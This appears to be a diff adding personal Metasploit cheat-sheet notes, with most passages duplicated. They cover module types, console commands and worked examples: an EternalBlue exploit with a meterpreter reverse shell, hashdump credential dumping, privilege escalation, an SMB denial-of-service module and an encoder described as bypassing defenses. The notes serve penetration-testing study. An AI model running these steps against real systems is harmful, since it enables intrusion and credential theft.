@@ -1,0 +1,303 @@
+   
+
+Metasploit
+
+### **1. Starting Metasploit**
+
+msfconsole  # Start Metasploit
+
+```
+msfconsole  # Start Metasploit
+```
+
+---
+
+### **2. Basic Commands**
+
+search <keyword>  # Search for modules  
+use <module>      # Use a module  
+show options      # Show module options  
+set RHOSTS <ip>   # Set target IP  
+set LHOST <ip>    # Set local IP  
+set PAYLOAD <payload>  # Choose payload  
+run / exploit     # Execute exploit  
+sessions -l       # List active sessions  
+sessions -i <id>  # Interact with a session  
+exit              # Exit Metasploit
+
+```
+search <keyword>  # Search for modules  
+use <module>      # Use a module  
+show options      # Show module options  
+set RHOSTS <ip>   # Set target IP  
+set LHOST <ip>    # Set local IP  
+set PAYLOAD <payload>  # Choose payload  
+run / exploit     # Execute exploit  
+sessions -l       # List active sessions  
+sessions -i <id>  # Interact with a session  
+exit              # Exit Metasploit
+```
+
+---
+
+### **3. Module Structure**
+
+<type>/<category>/<specific_module>
+
+```
+<type>/<category>/<specific_module>
+```
+
+|**Type**|**Example**|**Purpose**|
+|---|---|---|
+|**exploit/**|`exploit/windows/smb/ms17_010_eternalblue`|Exploits vulnerabilities|
+|**payload/**|`payload/windows/meterpreter/reverse_tcp`|Defines post-exploit action|
+|**auxiliary/**|`auxiliary/scanner/smb/smb_version`|Scanning & enumeration|
+|**post/**|`post/windows/gather/hashdump`|Post-exploitation|
+|**encoder/**|`encoder/x86/shikata_ga_nai`|Encode payloads|
+|**nop/**|`nop/x86/single_byte`|Generate NOP sleds|
+
+---
+
+### **4. Auxiliary Modules (`auxiliary/`)**
+
+Used for **scanning, enumeration, and attacks**.
+
+#### **Structure:**
+
+auxiliary/<category>/<protocol>/<module>
+
+```
+auxiliary/<category>/<protocol>/<module>
+```
+
+|**Category**|**Example Module**|**Purpose**|
+|---|---|---|
+|**scanner/**|`auxiliary/scanner/smb/smb_version`|Scan SMB version|
+|**dos/**|`auxiliary/dos/smb/smb_loris`|Denial of Service attack|
+|**fuzzer/**|`auxiliary/fuzzer/http/http_form_field`|Test application security|
+|**admin/**|`auxiliary/admin/mssql/mssql_exec`|Remote execution on MSSQL|
+
+#### **Example - Scan SMB version**
+
+use auxiliary/scanner/smb/smb_version
+set RHOSTS <target-ip>
+run
+
+```
+use auxiliary/scanner/smb/smb_version
+set RHOSTS <target-ip>
+run
+```
+
+---
+
+### **5. Exploit Modules (`exploit/`)**
+
+Used to **exploit vulnerabilities** in various services.
+
+#### **Structure:**
+
+exploit/<os>/<service>/<specific_exploit>
+
+```
+exploit/<os>/<service>/<specific_exploit>
+```
+
+|**OS**|**Example Module**|**Target**|
+|---|---|---|
+|**windows/**|`exploit/windows/smb/ms17_010_eternalblue`|Windows SMB|
+|**linux/**|`exploit/linux/http/struts_dmi_rce`|Apache Struts|
+|**unix/**|`exploit/unix/ftp/proftpd_modcopy_exec`|ProFTPD|
+|**multi/**|`exploit/multi/http/tomcat_mgr_deploy`|Multiple OS|
+
+#### **Example - Exploit MS17-010 (EternalBlue)**
+
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <target-ip>
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+
+```
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <target-ip>
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+```
+
+---
+
+### **6. Payload Modules (`payload/`)**
+
+Defines what happens after an exploit is successful.
+
+#### **Structure:**
+
+payload/<os>/<type>/<specific_payload>
+
+```
+payload/<os>/<type>/<specific_payload>
+```
+
+|**Type**|**Example Payload**|**Purpose**|
+|---|---|---|
+|**shell/**|`payload/windows/shell/reverse_tcp`|Simple command shell|
+|**meterpreter/**|`payload/linux/x86/meterpreter/reverse_tcp`|Interactive Meterpreter|
+|**stager/**|`payload/windows/x64/stager/bind_tcp`|Loads payloads in steps|
+
+#### **Example - Set Payload**
+
+use exploit/windows/smb/ms17_010_eternalblue
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+
+```
+use exploit/windows/smb/ms17_010_eternalblue
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+```
+
+---
+
+### **7. Post-Exploitation Modules (`post/`)**
+
+Used **after** exploitation to gather information, maintain access, or escalate privileges.
+
+#### **Structure:**
+
+post/<os>/<category>/<specific_module>
+
+```
+post/<os>/<category>/<specific_module>
+```
+
+|**Category**|**Example Module**|**Purpose**|
+|---|---|---|
+|**gather/**|`post/windows/gather/hashdump`|Dump password hashes|
+|**escalate/**|`post/windows/escalate/getsystem`|Privilege escalation|
+|**manage/**|`post/windows/manage/migrate`|Migrate processes|
+
+#### **Example - Dump Hashes**
+
+use post/windows/gather/hashdump
+set SESSION <session-id>
+run
+
+```
+use post/windows/gather/hashdump
+set SESSION <session-id>
+run
+```
+
+---
+
+### **8. Encoder Modules (`encoder/`)**
+
+Used to **encode payloads** to bypass security defenses.
+
+#### **Structure:**
+
+encoder/<type>/<specific_encoder>
+
+```
+encoder/<type>/<specific_encoder>
+```
+
+|**Type**|**Example Module**|**Purpose**|
+|---|---|---|
+|**x86/**|`encoder/x86/shikata_ga_nai`|Polymorphic shellcode encoder|
+|**cmd/**|`encoder/cmd/echo`|Encodes commands|
+
+#### **Example - Use an Encoder**
+
+use encoder/x86/shikata_ga_nai
+
+```
+use encoder/x86/shikata_ga_nai
+```
+
+---
+
+### **9. NOP Modules (`nop/`)**
+
+Used to generate **NOP sleds** to help exploits work correctly.
+
+#### **Structure:**
+
+nop/<architecture>/<specific_nop>
+
+```
+nop/<architecture>/<specific_nop>
+```
+
+|**Architecture**|**Example Module**|**Purpose**|
+|---|---|---|
+|**x86/**|`nop/x86/single_byte`|Generates simple NOP sleds|
+
+#### **Example - Use NOP**
+
+use nop/x86/single_byte
+
+```
+use nop/x86/single_byte
+```
+
+---
+
+### **10. Sessions & Meterpreter**
+
+|**Command**|**Purpose**|
+|---|---|
+|`sessions -l`|List active sessions|
+|`sessions -i <id>`|Interact with a session|
+|`shell`|Open command shell|
+|`upload <local> <remote>`|Upload a file|
+|`download <remote> <local>`|Download a file|
+
+#### **Example - Interact with Meterpreter**
+
+sessions -i 1
+shell
+
+```
+sessions -i 1
+shell
+```
+
+---
+
+### **11. Database & Credentials**
+
+|**Command**|**Purpose**|
+|---|---|
+|`service postgresql start`|Start database|
+|`msfdb init`|Initialize database|
+|`hosts`|List stored hosts|
+|`creds`|List stored credentials|
+
+---
+
+### **12. Exiting Metasploit**
+
+exit
+
+```
+exit
+```
+
+---
+
+### **Complete Summary of Metasploit Module Structure**
+
+|**Module Type**|**Example Path**|**Purpose**|
+|---|---|---|
+|**Exploit**|`exploit/windows/smb/ms17_010_eternalblue`|Exploiting vulnerabilities|
+|**Auxiliary**|`auxiliary/scanner/ssh/ssh_login`|Scanning and enumeration|
+|**Payload**|`payload/windows/meterpreter/reverse_tcp`|Defines post-exploit actions|
+|**Post**|`post/windows/gather/hashdump`|Post-exploitation actions|
+|**Encoder**|`encoder/x86/shikata_ga_nai`|Bypassing security defenses|
+|**NOP**|`nop/x86/single_byte`|Helps with shellcode execution|
+
+---
+
+This is the **complete** and **simple** reference, ready to copy into your notes! 🚀
